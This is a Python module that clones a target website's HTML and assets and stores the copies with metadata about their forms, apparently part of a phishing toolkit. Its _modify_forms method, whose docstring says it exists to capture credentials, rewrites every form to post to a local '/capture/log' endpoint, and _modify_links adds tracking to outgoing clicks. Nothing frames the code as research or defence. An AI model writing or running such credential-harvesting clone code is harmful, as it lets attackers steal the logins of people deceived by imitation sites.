#!/usr/bin/env python3
"""
Enhanced real website cloning with complete asset management
Properly downloads and links all page resources
"""

import requests
import os
import re
import json
import hashlib
from pathlib import Path
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import logging
import sys

# Add features to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from features.cloning import AssetDownloader

logger = logging.getLogger(__name__)

class RealCloner:
    """Real website cloning with complete asset management"""
    
    def __init__(self, clone_dir: str = "./templates/clones"):
        self.clone_dir = Path(clone_dir)
        self.clone_dir.mkdir(parents=True, exist_ok=True)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Cache-Control': 'no-cache'
        })
        self.asset_downloader = AssetDownloader(clone_dir)
    
    def clone_website(self, target_url: str, include_assets: bool = True) -> dict:
        """Clone website with real HTML and all assets properly linked"""
        try:
            logger.info(f"[+] Starting clone of: {target_url}")
            
            # Fetch main page
            response = self.session.get(target_url, timeout=30)
            response.raise_for_status()
            
            html_content = response.text
            
            # Generate clone ID
            clone_id = self._generate_clone_id(target_url)
            clone_path = self.clone_dir / clone_id
            clone_path.mkdir(exist_ok=True)
            
            logger.info(f"[+] Clone ID: {clone_id}")
            
            # Download and fix HTML
            if include_assets:
                logger.info("[*] Downloading assets...")
                fixed_html, assets_info = self.asset_downloader.download_and_fix_html(
                    html_content, target_url, clone_path
                )
            else:
                fixed_html = html_content
                assets_info = {'fixed_elements': 0, 'total_size': 0}
            
            # Save fixed HTML
            html_file = clone_path / "index.html"
            with open(html_file, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(fixed_html)
            
            logger.info(f"[+] HTML saved: {html_file}")
            
            # Parse modified HTML for additional info
            soup = BeautifulSoup(fixed_html, 'html.parser')
            
            # Save metadata
            metadata = {
                'clone_id': clone_id,
                'original_url': target_url,
                'cloned_at': str(Path(html_file).stat().st_mtime),
                'assets_info': assets_info,
                'form_endpoints': self._extract_form_info(soup),
                'title': soup.title.string if soup.title else 'Untitled',
                'description': self._extract_meta_tag(soup, 'description'),
                'keywords': self._extract_meta_tag(soup, 'keywords'),
                'total_size_kb': assets_info.get('total_size', 0) / 1024,
                'fixed_elements_count': assets_info.get('fixed_elements', 0)
            }
            
            metadata_file = clone_path / "metadata.json"
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            logger.info(f"[+] Website cloned successfully!")
            logger.info(f"    Total size: {metadata['total_size_kb']:.1f} KB")
            logger.info(f"    Fixed elements: {metadata['fixed_elements_count']}")
            
            return {
                'status': 'ok',
                'clone_id': clone_id,
                'clone_url': f'/clone/{clone_id}/',
                'metadata': metadata
            }
        
        except Exception as e:
            logger.error(f"[-] Clone error: {str(e)}")
            return {'status': 'error', 'message': str(e)}
    
    def _generate_clone_id(self, url: str) -> str:
        """Generate unique clone ID"""
        url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
        domain = urlparse(url).netloc.replace('.', '_')
        return f"{domain}_{url_hash}"
    
    def _modify_forms(self, soup: BeautifulSoup, clone_id: str, original_url: str):
        """Modify form actions to capture credentials"""
        for form in soup.find_all('form'):
            original_action = form.get('action', '')
            
            # Store original action in hidden field
            hidden_action = soup.new_tag('input', type='hidden', name='_original_action', 
                                        value=urljoin(original_url, original_action))
            form.insert(0, hidden_action)
            
            # Store original URL
            hidden_url = soup.new_tag('input', type='hidden', name='_original_url', 
                                     value=original_url)
            form.insert(1, hidden_url)
            
            # Redirect form to capture endpoint
            form['action'] = f'/capture/log/{clone_id}'
            form['method'] = 'POST'
            
            logger.debug(f"[*] Modified form: {original_action} -> {form['action']}")
    
    def _modify_links(self, soup: BeautifulSoup, original_url: str):
        """Modify links to stay within clone or log outgoing"""
        domain = urlparse(original_url).netloc
        
        for link in soup.find_all('a', href=True):
            href = link['href']
            
            # Skip anchors and javascript
            if href.startswith('#') or href.startswith('javascript:'):
                continue
            
            # Convert relative URLs to absolute
            if not href.startswith('http'):
                link['href'] = urljoin(original_url, href)
            
            # If external link, add tracking
            if domain not in link['href']:
                link['data-external'] = 'true'
                link['onclick'] = f"trackOutgoing('{link['href']}'); return true;"
    
    def _process_assets(self, soup: BeautifulSoup, original_url: str, clone_path: Path, clone_id: str = None) -> dict:
        """Download and process CSS, JS, and images"""
        assets = {
            'stylesheets': [],
            'scripts': [],
            'images': []
        }
        
        # Store clone_id for asset path construction
        if clone_id is None:
            clone_id = clone_path.name
        
        # CSS files
        for link in soup.find_all('link', rel='stylesheet'):
            href = link.get('href', '')
            if href:
                full_url = urljoin(original_url, href)
                local_path = self._download_asset(full_url, clone_path, 'css')
                if local_path:
                    # Fixed: Include clone_id in path
                    link['href'] = f'/clone/{clone_id}/{local_path}'
                    assets['stylesheets'].append(full_url)
        
        # JavaScript files
        for script in soup.find_all('script', src=True):
            src = script.get('src', '')
            if src:
                full_url = urljoin(original_url, src)
                local_path = self._download_asset(full_url, clone_path, 'js')
                if local_path:
                    # Fixed: Include clone_id in path
                    script['src'] = f'/clone/{clone_id}/{local_path}'
                    assets['scripts'].append(full_url)
        
        # Images (just repoint to originals, don't download all)
        for img in soup.find_all('img'):
            src = img.get('src', '')
            if src and not src.startswith('http'):
                img['src'] = urljoin(original_url, src)
            elif src:
                img['loading'] = 'lazy'
        
        return assets
    
    def _download_asset(self, url: str, clone_path: Path, asset_type: str) -> str:
        """Download asset and return local path"""
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code != 200:
                return None
            
            # Generate filename
            filename = hashlib.md5(url.encode()).hexdigest()
            ext = '.css' if asset_type == 'css' else '.js'
            
            asset_path = clone_path / asset_type / f"{filename}{ext}"
            asset_path.parent.mkdir(exist_ok=True)
            
            with open(asset_path, 'wb') as f:
                f.write(response.content)
            
            return str(asset_path.relative_to(self.clone_dir))
        except Exception as e:
            logger.warning(f"[!] Failed to download asset {url}: {str(e)}")
            return None
    
    def _extract_meta_tag(self, soup: BeautifulSoup, name: str) -> str:
        """Extract meta tag content"""
        meta = soup.find('meta', attrs={'name': name})
        return meta.get('content', '') if meta else ''
    
    def _extract_form_info(self, soup: BeautifulSoup) -> list:
        """Extract form information"""
        forms = []
        for form in soup.find_all('form'):
            forms.append({
                'id': form.get('id', 'unknown'),
                'action': form.get('action', ''),
                'method': form.get('method', 'GET'),
                'fields': len(form.find_all(['input', 'textarea', 'select']))
            })
        return forms
    
    def get_clone_html(self, clone_id: str) -> str:
        """Get HTML for displaying clone"""
        clone_path = self.clone_dir / clone_id / "index.html"
        
        if clone_path.exists():
            with open(clone_path, 'r', encoding='utf-8', errors='ignore') as f:
                return f.read()
        
        return None
    
    def list_clones(self) -> list:
        """List all available clones"""
        clones = []
        
        for clone_dir in self.clone_dir.iterdir():
            if clone_dir.is_dir():
                metadata_file = clone_dir / "metadata.json"
                if metadata_file.exists():
                    with open(metadata_file, 'r') as f:
                        metadata = json.load(f)
                        clones.append(metadata)
        
        return clones
